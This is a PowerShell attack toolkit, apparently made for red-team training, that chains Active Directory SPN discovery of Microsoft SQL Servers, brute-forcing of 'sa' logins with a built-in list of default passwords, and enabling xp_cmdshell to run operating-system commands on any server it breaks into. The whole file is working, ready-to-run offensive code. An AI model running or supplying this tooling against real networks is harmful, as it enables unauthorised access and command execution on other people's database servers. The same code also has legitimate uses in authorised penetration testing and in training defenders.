Function Invoke-MSSQLBrute {
<#
.SYNOPSIS
    Performs brute-force attack against Microsoft SQL Server credentials
.DESCRIPTION
    It tries to login to specified hosts with provided credentials
.PARAMETER Hosts
    Hosts to try. Default port for MSSQL is 1433, if you have a host on another one 
    enter it using comma (not colon), for example: 172.16.100.10,1432
.PARAMETER Users
    Users array, default sa (superadmin)
.PARAMETER Passwords
    List of passwords to check, there are some default from few ERPs
.PARAMETER StopOnSuccess
    Stop trying other passwords for the host after first positive guess
.PARAMETER OnlyValid
    Show only valid passwords in verbose mode (don't show incorrect tries)
.INPUTS
    Hosts array
.OUTPUTS
    Array of objects with proporties: Host, User, Password, ServerVersion
.NOTES
    Author: Pawel Maziarz <pawel.maziarz@immunity-systems.com>
.EXAMPLE
    Invoke-MSSQLBrute -Hosts 172.16.0.1 -Users sa,sasage -Passwords "","password","sa"
.EXAMPLE
    Invoke-MSSQLBrute -Hosts "sqlsrv.local","172.16.100.10,1432"
.EXAMPLE
    1..10 | % {"192.168.0.$_"} | Invoke-MSSQLBrute
.LINK
https://blog.aptmasterclass.com/
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeline = $true)]
        [String[]]$Hosts,
        [Parameter(Position = 1)]
        [String[]]$Users = "sa",
        [Parameter(Position = 2)]
        [String[]]$Passwords = ("", "sa", "password", "P@ssw0rd", "Comarch!2011", "reset2"),
        [Switch]$StopOnSuccess = $true,
        [Switch]$OnlyValid = $false
    )

    Begin {
        $Result = @()
        $stats = @{ hostcount = 0; tries = 0; found = 0 }
    }

    Process {
        ForEach ($_host in $Hosts) {
            Write-Verbose "[*] Trying host $_host"
            $stats.hostcount++
            :userLoop foreach ($_user in $Users) {
                ForEach ($_pass in $Passwords) {
                    $Connection = New-Object System.Data.SQLClient.SQLConnection
                    $Connection.ConnectionString = "Data Source=$_host;Persist Security Info=True;User ID=$_user;Password=$_pass"
                    try {
                        $stats.tries++
                        $Connection.Open()
                        $stats.found++
                        $o = New-Object -TypeName psobject 
                        $o | Add-Member -MemberType NoteProperty -Name Host -Value $_host
                        $o | Add-Member -MemberType NoteProperty -Name User -Value $_user
                        $o | Add-Member -MemberType NoteProperty -Name Password -Value $_pass
                        $result += $o
                        Write-Verbose "[+] $_user@$_host - '$_pass'" 
                        Write-Verbose "[+]    Server version: $($connection.ServerVersion)"
                        if ($StopOnSuccess -eq $true) {
                            break :userLoop
                        }
                    }
                    catch [Exception] {
                        if ($OnlyValid -eq $false) {
                            Write-Verbose "[-] $_user@$_host - '$_pass'" 
                        }
                    }
                }
            }
        }
    }

    End {
        Write-Verbose "[*] Tried hosts: $($stats.hostcount), login attempts: $($stats.tries), successful: $($stats.found)"
        $Result
    }

}Function Invoke-MSSQLExec {

    <#
.SYNOPSIS
    Utilizes xp_cmdshell on Microsoft SQL Server to execute command in OS
.DESCRIPTION
    Microsoft SQL Server has xp_cmdshell procedure which executes any command in 
    operating system. This function tries to laverage that functionality. 
.PARAMETER Targets
    Array with targets (each object in array should have Host, Username and Pasword properties)
.PARAMETER Target
    Target to exec. Default port for MSSQL is 1433, if you have a host on another one 
    enter it using comma (not colon), for example: 172.16.100.10,1432
.PARAMETER User
    Username (should be sa or other with admin privileges)
.PARAMETER Password
    Password for superadmin
.INPUTS
    Hosts array
.OUTPUTS
    Array of objects with proporties: Host, User, Password, Command, Output
.NOTES
    Author: Pawel Maziarz <pawel.maziarz@immunity-systems.com>
.EXAMPLE
    Invoke-MSSQLExec -host "172.16.0.100" -User  sa -p 'P@ssw0rd' -Command "whoami" -verbose
.EXAMPLE
    $targets =
        @{Host="172.16.0.101";User="sa";Password="Zima2019!"},
        @{Host="172.16.0.102";User="sa";Password="P@ssw0rd"}

        Invoke-MSSQLExec -Targets $targets -Command "whoami" -Verbose|format-list
.EXAMPLE
    Invoke-MSSQLSPNSearch | Invoke-MSSQLBrute | Invoke-MSSQLExec -Command whoami
.LINK
https://blog.aptmasterclass.com/
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeline = $true, ParameterSetName = 'object')]
        [Object[]]$Targets,

        [Parameter(Mandatory = $true, ParameterSetName = 'host')]
        [Alias("Server", "Host")]
        [String]$Target,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'host')]
        [String]$User = "sa",
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'host')]
        [String]$Password = (""),
        [Parameter(ValueFromPipelineByPropertyName = $true)]
        [String]$Command = (""),
        [Parameter()]
        [ValidateSet('No','IfNeeded')]
        [String]$EnableXpCmdShell = ("IfNeeded"),
        [Parameter()]
        [ValidateSet('Yes','IfModified', 'No')]
        [String]$DisableXpCmdShell = ("IfModified")

    )

    Begin {
        $Result = @()
        $XPCmdShellModified = $false
        $enable_xp_cmdshell_query = @'
exec sp_configure 'show advanced options', 1 
RECONFIGURE 
EXEC sp_configure 'xp_cmdshell', 1;  
RECONFIGURE;  
'@
        $disable_xp_cmdshell_query = @'
exec sp_configure 'show advanced options', 1 
RECONFIGURE 
EXEC sp_configure 'xp_cmdshell', 0;  
RECONFIGURE;  
'@

        $check_xp_cmdshell_query = @'
SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured 
FROM sys.configurations 
WHERE name = 'xp_cmdshell';
'@

        function query($conn, $sql) {
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $sql
            $result = $cmd.ExecuteReader()
            $table = new-object "System.Data.DataTable"
            $table.Load($result)
            return $table
        }
        function xp_cmdshell_enable($conn) {
            query $conn $enable_xp_cmdshell_query
        }
        function xp_cmdshell_disable($conn) {
            query $conn $disable_xp_cmdshell_query
        }
        function xp_cmdshell_check($conn) {
            $t = query $conn $check_xp_cmdshell_query
            return $t.IsConfigured
        }
    }

    Process {
        if ($PSCmdlet.ParameterSetName -eq "host") {
            $Targets = @{Host=$Target;User=$User;Password=$Password}
        }

        ForEach ($obj in $Targets) {
            $target = $obj.Host -Replace ':',','
            $user = $obj.User
            $password = $obj.Password
            Write-Verbose "[*] Trying host $target"
            $Connection = New-Object System.Data.SQLClient.SQLConnection
            $Connection.ConnectionString = "Data Source=$target;Persist Security Info=True;User ID=$user;Password=$password"
            try {
                $Connection.Open()
                Write-Verbose "[*] Connected to $target"
                try {
                    if ($EnableXpCmdShell -eq "IfNeeded") {
                        Write-Verbose "[*] Checking whether xp_cmdshell is enabled"
                        $enabled = xp_cmdshell_check $Connection
                        Write-Verbose "[*] xp_cmdshell enabled: $enabled"
                        if ($enabled -eq 0) {
                            Write-Verbose "[*] Enabling xp_cmdshell"
                            xp_cmdshell_enable $Connection
                            $XPCmdShellModified = $true
                        }
                    }

                    Write-Verbose "[*] Trying to execute xp_cmdshell '$Command'"
                    try {
                        $output = query $Connection "exec xp_cmdshell '$Command'"

                        $o = New-Object -TypeName psobject 
                        $o | Add-Member -MemberType NoteProperty -Name Host -Value $target
                        $o | Add-Member -MemberType NoteProperty -Name User -Value $user
                        $o | Add-Member -MemberType NoteProperty -Name Password -Value $password
                        $o | Add-Member -MemberType NoteProperty -Name Command -Value $Command
                        $o | Add-Member -MemberType NoteProperty -Name Output -Value ($output.output -join "`n")
                        $Result += $o
                    } catch [Exception] {
                        Write-Error "Whoops"
                        Write-Host $_.Exception.Message
                    }

                    if ($DisableXpCmdShell -eq "Yes" -or ($XPCmdShellModified -eq $true -and $DisableXpCmdShell -eq "IfModified")) {
                        Write-Verbose "[*] Disabling xp_cmdshell"
                        xp_cmdshell_disable $Connection
                    }
                }
                catch [Exception] {
                    Write-Error "Whoops"
                    Write-Host $_.Exception.Message
                }
            }
            catch [Exception] {
                Write-Verbose "[*] Can't connect to $_host ($($User):$($Password))"
            }
        }
    }

    End {
        $Result
    }

}Function Invoke-MSSQLSPNSearch {

    <#
.SYNOPSIS
    Search for Microsoft SQL Servers by SPN (Service Principal Name) 
.DESCRIPTION
    It tries to find MSSQL services in Active Directory
.PARAMETER Method
    Raw Powershell (Powershell) with SETSPN.EXE (setspn)
.INPUTS
    None
.OUTPUTS
    Strings with MSSQL addresses
.NOTES
    Author: Pawel Maziarz <pawel.maziarz@immunity-systems.com>
.EXAMPLE
    Invoke-MSSQLSPNSearch -Method setspn
.EXAMPLE
    Invoke-MSSQLSPNSearch | Invoke-MSSQLBrute | Invoke-MSSQLExec -Command "whoami"
.LINK
https://blog.aptmasterclass.com/
#>

    [CmdletBinding()]
    Param(
        [Parameter()]
        [ValidateSet('Powershell','setspn')]
        [String]$Method = ("Powershell")
    )

    Begin {
        $Result = @()
    }

    Process {
        if ($Method -eq "setspn") {
            Write-Verbose "[*] Using setspn.exe"

            (setspn -Q MSSQLSvc/*) -match "MSSQL" | % { 
                $Result += $_.Trim().Split("/")[1] -Replace ':1433',''
            }
        }  elseif ($Method -eq  "Powershell") {
            Write-Verbose "[*] Using Powershell"

            $s = [ADSISearcher]([ADSI]"")
            $s.filter = "(servicePrincipalName=MSSQL*)"
            $s.FindAll() | % {
                $_.GetDirectoryEntry().servicePrincipalName -match "MSSQL" | % {
                    $Result += $_.Split("/")[1] -Replace ':1433',''
                }
            }
        }
    }

    End {
        $Result = $Result | select -uniq
        $Result
    }

}Function Invoke-MSSQLSPNSearchBruteAndExec {

    <#
.SYNOPSIS
    Search for Microsoft SQL Servers by SPN (Service Principal Name), 
    try to guess passwords and exec command
.DESCRIPTION
    It utilizes Invoke-MSSQLSPNSearch, Invoke-MSSQLBrute and Invoke-MSSQLExec functions
.PARAMETER Command
    Command to execute
.INPUTS
    None
.OUTPUTS
    Array of objects with proporties: Host, User, Password, Command, Output
.NOTES
    Author: Pawel Maziarz <pawel.maziarz@immunity-systems.com>
.EXAMPLE
    Invoke-MSSQLSPNSearchBruteAndExec 
.EXAMPLE
    Invoke-MSSQLSPNSearchBruteAndExec -Command "net user" -Verbose
.LINK
https://blog.aptmasterclass.com/
#>

    [CmdletBinding()]
    Param(
        [Parameter()]
        [String]$Command = ("whoami")
    )

    Begin {
    }

    Process {
        Invoke-MSSQLSPNSearch | Invoke-MSSQLBrute | Invoke-MSSQLExec -Command $Command
    }

    End {
    }

}